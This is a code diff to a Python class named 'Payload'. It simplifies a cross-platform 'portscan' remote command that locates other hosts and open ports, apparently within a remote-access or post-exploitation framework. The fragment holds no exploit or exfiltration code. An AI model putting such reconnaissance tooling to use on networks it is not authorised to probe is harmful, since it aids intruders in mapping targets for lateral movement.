@@ -783,34 +783,25 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.process.func_name, str(e)))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <mode> <target>')
-    def portscan(self, args=None):
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
+    def portscan(self, target=None):
         """ 
         Scan a target host or network to identify 
         other target hosts and open ports.
 
         `Required`
-        :param str mode:        host, network
         :param str target:      IPv4 address
         
         """
         if 'portscanner' not in globals():
             self.load('portscanner')
         try:
-            if not args:
-                return 'portscan <mode> <target>'
-            mode, _, target = str(args).partition(' ')
-            if not mode:
-                return 'portscan <mode> <target>'
             if target:
                 if not ipv4(target):
                     return "Error: invalid IP address '%s'" % target
+                return globals()['portscanner'].run(target)
             else:
-                target = socket.gethostbyname(socket.gethostname())
-            if hasattr(globals()['portscanner'], mode):
-                return getattr(globals()['portscanner'], mode)(target)
-            else:
-                return "Error: invalid mode '%s'" % mode
+                return self.portscan.usage
         except Exception as e:
             log("{} error: {}".format(self.portscan.func_name, str(e)))
 
